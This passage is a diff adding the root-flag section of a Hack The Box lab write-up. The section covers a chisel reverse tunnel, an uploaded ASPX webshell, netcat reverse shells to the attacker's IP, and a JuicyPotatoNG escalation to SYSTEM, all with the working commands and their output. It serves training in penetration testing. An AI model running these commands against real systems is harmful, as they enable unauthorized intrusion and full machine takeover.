@@ -717,6 +717,139 @@ We can proceed to get the user flag from here.
 
 ## Root Flag
 
+Let's explore port 8000 on the remote machine. First we'll need to upload chisel to the remote machine.
+
+```
+C:\Users\C.Bum\Desktop>powershell -c wget http://10.10.15.194:8000/chisel.exe -outfile chisel.exe
+```
+
+Now let's start a server on our attack box.
+
+```
+┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-dlszgby3kh]─[~]
+└──╼ [★]$ ./chisel_1.12.0_linux_amd64 server --port 8001 --reverse
+2026/11/19 18:03:38 server: Reverse tunnelling enabled
+2026/11/19 18:03:38 server: Fingerprint WuXom2k51WLsruckGs4GVlU1/+XzK9cBhYQMn1z4ujI=
+2026/11/19 18:03:38 server: Listening on http://0.0.0.0:8001
+```
+
+Connect back to our server.
+
+```
+C:\Users\C.Bum\Desktop>powershell -c .\chisel.exe client 10.10.15.194:8001 R:8002:127.0.0.1:8000
+powershell -c .\chisel.exe client 10.10.15.194:8001 R:8002:127.0.0.1:8000
+2026/11/19 22:08:05 client: Connecting to ws://10.10.15.194:8001
+2026/11/19 22:08:05 client: Connected (Latency 7.701ms)
+```
+
+```
+┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-dlszgby3kh]─[~]
+└──╼ [★]$ ./chisel_1.12.0_linux_amd64 server --port 8001 --reverse
+2026/11/19 18:07:37 server: Reverse tunnelling enabled
+2026/11/19 18:07:37 server: Fingerprint o2hCYhnH2XdR8QAF/FnkjgHbjmBBCCaO5lyB/IwZlnY=
+2026/11/19 18:07:37 server: Listening on http://0.0.0.0:8001
+2026/11/19 18:08:04 server: session#1: Open (user=- addr=10.129.228.120:53534 remotes=R:0.0.0.0:8002:127.0.0.1:8000)
+2026/11/19 18:08:04 server: session#1: tun: proxy#R:8002=>8000: Listening
+```
+
+Now we can navigate to ```http://127.0.0.1:8002``` and check out the development website.
+
+It seems awfully normal. However, Wappalyzer tells us that this is powered by ASP.NET instead of Apache.
+
+![9](Screenshots/F_9.jpg)
+
+Since ```C.bum``` has write access to the web directory here, we should be able to place an aspx webshell in it and get a shell as the user running the development website.
+
+```
+C:\inetpub\development>powershell -c wget http://10.10.15.194:8000/cmdasp.aspx -outfile cmdasp.aspx
+powershell -c wget http://10.10.15.194:8000/cmdasp.aspx -outfile cmdasp.aspx
+
+C:\inetpub\development>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 1DF4-493D
+
+ Directory of C:\inetpub\development
+
+11/19/2026  10:17 PM    <DIR>          .
+11/19/2026  10:17 PM    <DIR>          ..
+11/19/2026  10:17 PM             1,400 cmdasp.aspx
+11/19/2026  10:17 PM    <DIR>          development
+               1 File(s)          1,400 bytes
+               3 Dir(s)   5,016,584,192 bytes free
+```
+
+The upload is successful.
+
+![10](Screenshots/F_10.jpg)
+
+Now, typing in this command on the webshell: ```powershell -c c:\inetpub\development\development\nc.exe 10.10.15.194 9999 -e cmd```
+
+We catch another shell on a listener, this time as ```iis apppool\defaultapppool```.
+
+```
+┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-dlszgby3kh]─[~]
+└──╼ [★]$ rlwrap nc -lvnp 9999
+Listening on 0.0.0.0 9999
+Connection received on 10.129.228.120 53619
+Microsoft Windows [Version 10.0.17763.2989]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\windows\system32\inetsrv>whoami
+whoami
+iis apppool\defaultapppool
+```
+
+This account has ```SeImpersonatePrivilege``` enabled.
+
+```
+C:\windows\system32\inetsrv>whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+```
+
+Let's use JuicyPotatoNG.
+
+```
+C:\Windows\Temp>powershell -c wget http://10.10.15.194:8000/JuicyPotatoNG.exe -outfile JuicyPotatoNG.exe
+```
+
+After running it, we get a shell as ```NT AUTHORITY\SYSTEM```.
+
+```
+PS C:\Windows\Temp> .\JuicyPotatoNG.exe -t * -p "C:\Windows\system32\cmd.exe" -a "/c C:\Windows\temp\nc.exe 10.10.15.194 5555 -e cmd"
+```
+
+```
+┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-dlszgby3kh]─[~]
+└──╼ [★]$ rlwrap nc -lvnp 5555
+Listening on 0.0.0.0 5555
+Connection received on 10.129.228.120 53958
+Microsoft Windows [Version 10.0.17763.2989]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\>whoami
+whoami
+nt authority\system
+```
+
+We can proceed to get the root flag from here.
+
+Nice pwn!
+
 ## Contact
 
 Email: <johnyang4406@gmail.com>, <john_s_yang@brown.edu>
